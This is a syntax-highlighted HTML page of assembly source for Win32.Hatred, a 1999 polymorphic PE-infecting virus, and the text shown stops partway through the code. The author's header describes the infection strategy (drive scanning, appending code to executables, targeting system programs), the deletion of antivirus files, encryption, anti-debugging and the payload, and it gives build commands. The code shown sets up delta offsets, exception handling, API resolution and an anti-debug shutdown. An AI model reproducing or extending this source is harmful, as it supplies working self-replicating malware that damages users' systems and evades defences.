<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Hatred.a - HATRED.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment $</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                 Win32.Hatred</span><span class="sc0">
</span><span class="sc1">;                                    V.1.0</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                            by Lord Julus / [SLAM]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                  April 1999</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Hello everybody and welcome to the source code of my new virus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         ==============================================================</span><span class="sc0">
</span><span class="sc1">;         Briefing</span><span class="sc0">
</span><span class="sc1">;         ===============================================================</span><span class="sc0">
</span><span class="sc1">;         Virus Name        - Win32.Hatred</span><span class="sc0">
</span><span class="sc1">;         Virus Author      - Lord Julus / [SLAM]</span><span class="sc0">
</span><span class="sc1">;         Version           - V.1.0</span><span class="sc0">
</span><span class="sc1">;         Release Date      - 25 April 1999</span><span class="sc0">
</span><span class="sc1">;         Platform          - Win32, Win95/98, WinNT</span><span class="sc0">
</span><span class="sc1">;         Type              - Parasitic PE infector, directory scanning</span><span class="sc0">
</span><span class="sc1">;         Infects           - Win32 Portable Exe files (.EXE, .SCR)</span><span class="sc0">
</span><span class="sc1">;         Encrypted         - Yes</span><span class="sc0">
</span><span class="sc1">;         Polymorphic       - Yes (Uses an enhanced version of MOF32)</span><span class="sc0">
</span><span class="sc1">;         Retrovirus        - Yes</span><span class="sc0">
</span><span class="sc1">;         Anti-debugging    - Yes</span><span class="sc0">
</span><span class="sc1">;         Payload           - Graphical (Message box and screen fade out</span><span class="sc0">
</span><span class="sc1">;                             with pixel blackout; can be stopped by ESC)</span><span class="sc0">
</span><span class="sc1">;         ===============================================================</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         This virus works kinda like this way:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         When  the virus starts, first it locates the following win32 module</span><span class="sc0">
</span><span class="sc1">;  bases:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Kernel32.dll</span><span class="sc0">
</span><span class="sc1">;         Advapi32.dll</span><span class="sc0">
</span><span class="sc1">;         User32.dll</span><span class="sc0">
</span><span class="sc1">;         Gdi32.dll</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         and  their  corresponding  API  function addresses. If this goal is</span><span class="sc0">
</span><span class="sc1">;  achieved without any errors, the virus checks the system out and makes out</span><span class="sc0">
</span><span class="sc1">;  an array containing all drive names that are fixed disks, like this:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         "c:\", "d:\", ..., 0FFh</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         This list will be used in infection later.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         After that, the virus checks the registry for this key:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         "HKEY_CURRENT_USER\Control Panel\Cursors"</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         If it can be opened then the following name is queried:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         "dertaH"</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         If  the  value  can be retrieved, it is decrypted with a simple XOR</span><span class="sc0">
</span><span class="sc1">;  algorithm  and  then  it is checked to see if it is really a valid path on</span><span class="sc0">
</span><span class="sc1">;  the hard disk.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         If  the  value cannot be retrieved, or the value retrieved is not a</span><span class="sc0">
</span><span class="sc1">;  valid  path  on  the  HDD,  then the virus initializes the key name with a</span><span class="sc0">
</span><span class="sc1">;  value equal to the first entry in the drives list ("C:\", for ex.).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         After this is done, the scanning procedure is started. The scanning</span><span class="sc0">
</span><span class="sc1">;  procedure  starts  scanning from the root of the matching drive (the drive</span><span class="sc0">
</span><span class="sc1">;  that  was retrieved from the registry) and goes all the way until it finds</span><span class="sc0">
</span><span class="sc1">;  out  the  directory  specified  in the registry (if the virus runs for the</span><span class="sc0">
</span><span class="sc1">;  first  time,  the  first  directory  will  be  the root itself). From that</span><span class="sc0">
</span><span class="sc1">;  directory  on, the virus scans the harddisk for PE files, trying to locate</span><span class="sc0">
</span><span class="sc1">;  5  PE  files.  If  the  5  PE  files  are  not  found on one HDD or on one</span><span class="sc0">
</span><span class="sc1">;  partition,  the  scanning  goes on with the next partition or hdd, as they</span><span class="sc0">
</span><span class="sc1">;  are  found  in  the  drives  list. If the search reaches the end of drives</span><span class="sc0">
</span><span class="sc1">;  list,  but  still  5 PE files were not found, this means that all harddisk</span><span class="sc0">
</span><span class="sc1">;  drives  and all partition tables were checked once and all PE files on the</span><span class="sc0">
</span><span class="sc1">;  entire  system  are  infected. So, the virus resets it's first path to the</span><span class="sc0">
</span><span class="sc1">;  first  root,  and  the  scanning  process  starts  from  the beginning. To</span><span class="sc0">
</span><span class="sc1">;  prevent  a  big system slowdown only 90 directories are checked at a time.</span><span class="sc0">
</span><span class="sc1">;  In  this way, as I tested the scanning procedures many times, basically no</span><span class="sc0">
</span><span class="sc1">;  slowdown  is  notticed.  Still,  all drives and partitions are scanned and</span><span class="sc0">
</span><span class="sc1">;  infected.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Once  5 files were found, or more than 90 directories were checked,</span><span class="sc0">
</span><span class="sc1">;  the  virus  goes back into the registry and marks there the last directory</span><span class="sc0">
</span><span class="sc1">;  that  was checked. This will be used the next time the virus starts as the</span><span class="sc0">
</span><span class="sc1">;  starting point for the scanning.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         In  the  beginning,  if the key inside the registry is not found, a</span><span class="sc0">
</span><span class="sc1">;  direct  attack  procedure  is  started  which  searches  and  infects  the</span><span class="sc0">
</span><span class="sc1">;  following files:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         CDPLAYER.EXE</span><span class="sc0">
</span><span class="sc1">;         CALC.EXE</span><span class="sc0">
</span><span class="sc1">;         PBRUSH.EXE</span><span class="sc0">
</span><span class="sc1">;         MPLAYER.EXE</span><span class="sc0">
</span><span class="sc1">;         NOTEPAD.EXE</span><span class="sc0">
</span><span class="sc1">;         WINHLP32.EXE</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         The  appending  method  is  the  last  section  increase. The virus</span><span class="sc0">
</span><span class="sc1">;  attaches  itself to last section's RVA plus it's virtual size and sets the</span><span class="sc0">
</span><span class="sc1">;  file entrypoint to itself. After finishing all the work, the virus returns</span><span class="sc0">
</span><span class="sc1">;  the control to the host restoring all registers, stack and SEH handlers.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Each  time  one  directory  is  checked for PE files, all antivirus</span><span class="sc0">
</span><span class="sc1">;  checksum  files  found  in  that directory get erased. The virus avoids to</span><span class="sc0">
</span><span class="sc1">;  infect files with certain names (AV file names)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         The PE files are marked as infected like this:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Win32VersionValue is set to 'H8'</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         This  virus  includes  a slighty modified version of the MOF32 poly</span><span class="sc0">
</span><span class="sc1">;  engine and from my calculation only 4 bytes stay unencrypted in the victim</span><span class="sc0">
</span><span class="sc1">;  file,  which  is  pretty  cool...</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         For  the  Anti-debugging  I  have  used some apis that notifies the</span><span class="sc0">
</span><span class="sc1">;  presence  of a debugger and the file is automatically closed. I tried this</span><span class="sc0">
</span><span class="sc1">;  using  the  debugger  in  Visual  C++ and it works. Should crash many code</span><span class="sc0">
</span><span class="sc1">;  emulators which rely on the use of win32 debugging methods.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         This is far the best virus I wrote so far, probably due to the poly</span><span class="sc0">
</span><span class="sc1">;  engine  and the way it is spreading, and it has the highest possibility of</span><span class="sc0">
</span><span class="sc1">;  spreading,  being  very  infectious. I guess probably this will be my last</span><span class="sc0">
</span><span class="sc1">;  win32  directory  scanning virus and my next code will be a resident win32</span><span class="sc0">
</span><span class="sc1">;  virus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                         Farewell,</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                    ³    Lord Julus - 1999    ³</span><span class="sc0">
</span><span class="sc1">;                                    ÀÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                    ======         =======         ======</span><span class="sc0">
</span><span class="sc1">;             =======      With Heart feel Hatred!!!      ======</span><span class="sc0">
</span><span class="sc1">;         ======      Black blood runs through my veins!!     ======</span><span class="sc0">
</span><span class="sc1">;              ======         Hatred!!! Hatred!!!         =====</span><span class="sc0">
</span><span class="sc1">;                    ========                      =======</span><span class="sc0">
</span><span class="sc1">;                                 ===========</span><span class="sc0">
</span><span class="sc1">;                                  (ManOwaR)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Assemble with: TASM32 -ml -m hatred.asm</span><span class="sc0">
</span><span class="sc1">;                 TLINK32 -Tpe -aa -c hatred,,,import32.lib</span><span class="sc0">
</span><span class="sc1">;                 PEWRSEC hatred.exe</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         $</span><span class="sc0">

</span><span class="sc1">; [ EQUATES ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The following equates are crucial for the way this code gets compiled.</span><span class="sc0">
</span><span class="sc1">; You must be warned that changing any of these values might make this</span><span class="sc0">
</span><span class="sc1">; code act diferently. You modify them at your own will.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To simply test the directory search capability set the value TESTONLY</span><span class="sc0">
</span><span class="sc1">; to TRUE and look in the registry (no files are searched)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To only have infection on files like GOAT* set the value DEBUG to TRUE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To test the payload of this virus set DEBUG and TESTONLY to TRUE and set</span><span class="sc0">
</span><span class="sc1">; the date to day 07.</span><span class="sc0">

</span><span class="sc5">TRUE</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FALSE</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">FALSE</span><span class="sc0"> </span><span class="sc1">; If TRUE only GOAT* files are searched</span><span class="sc0">
</span><span class="sc5">TESTONLY</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">FALSE</span><span class="sc0"> </span><span class="sc1">; If True only dir. scan and reg. update</span><span class="sc0">
</span><span class="sc5">RETRO</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">TRUE</span><span class="sc0">  </span><span class="sc1">; kill av files?</span><span class="sc0">


</span><span class="sc2">.386p</span><span class="sc0">                                              </span><span class="sc1">; needed stuff</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                            </span><span class="sc1">; externals</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                      </span><span class="sc1">; save all</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">jump_code</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">decrypt</span><span class="sc0">                                 </span><span class="sc1">; call poly decryptor</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">realstart</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">start_of_code</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">                               </span><span class="sc1">; get delta handle</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">getdelta</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                        </span><span class="sc1">; save delta for later</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExceptionExit</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Setup a SEH frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; first let's locate the</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_name</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; kernel32 base address</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateKernel32</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; save it...</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">getprocaddress</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; then let's locate</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateGetProcAddress</span><span class="sc0">                   </span><span class="sc1">; GetProcAddress</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; now let's locate all</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; the K32 apis we need</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32_API_names</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; furthure...</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32_API_addrs</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApiAddresses</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32_name</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Locate USER32</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateModuleBase</span><span class="sc0">                       </span><span class="sc1">; module base</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">u32_API_names</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; and the corresp.</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">u32_API_addrs</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; API addresses</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApiAddresses</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                                    </span><span class="sc1">; Anti-debugging !!</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_IsDebuggerPresent</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Let's check if our</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; process is being</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">shut_down</span><span class="sc0">                               </span><span class="sc1">; debugged.</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continue_process</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">shut_down</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">; If so, close down!!</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">               </span><span class="sc1">; this doesn't really</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitWindowsEx</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; close Windoze...</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc1">;----------------------------------------------;</span><span class="sc0">
       </span><span class="sc5">continue_process</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">advapi32_name</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Locate the ADVAPI32</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateModuleBase</span><span class="sc0">                       </span><span class="sc1">; module base</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a32_API_names</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; and the corresp.</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a32_API_addrs</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; API addresses</span><span class="sc0">
